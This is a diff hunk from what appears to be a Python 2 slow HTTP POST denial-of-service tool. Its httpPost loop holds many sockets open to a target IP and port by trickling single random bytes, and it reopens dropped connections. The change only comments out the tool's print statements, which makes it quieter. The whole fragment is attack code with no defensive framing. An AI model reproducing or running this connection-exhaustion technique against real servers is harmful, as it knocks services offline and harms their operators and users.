@@ -57,19 +57,19 @@ def httpPost(ID, portDest, ipDest, event, queue, n):
         socketsList.append(s)
 
     while event.is_set():
-        print "[HTTP-POST] Sending keep-alive headers... \
-               Socket count: %s\n" %(len(socketsList))
+#        print "[HTTP-POST] Sending keep-alive headers... \
+#               Socket count: %s\n" %(len(socketsList))
 
         for s in list(socketsList):
             try:
                 s.send(pack('!B', random.getrandbits(8)))
             except socket.error, exc:
-                print"Erro: %s" %(exc)
+#              print"Erro: %s" %(exc)
                 socketsList.remove(s)
 
         for _ in range(nSockets - len(socketsList)):
-            print "[HTTP-POST] Recreating socket...\
-                Socket count: %s\n" %(len(socketsList))
+#            print "[HTTP-POST] Recreating socket...\
+#               Socket count: %s\n" %(len(socketsList))
 
             try:
                 s = init_socket(ipDest, int(portDest))
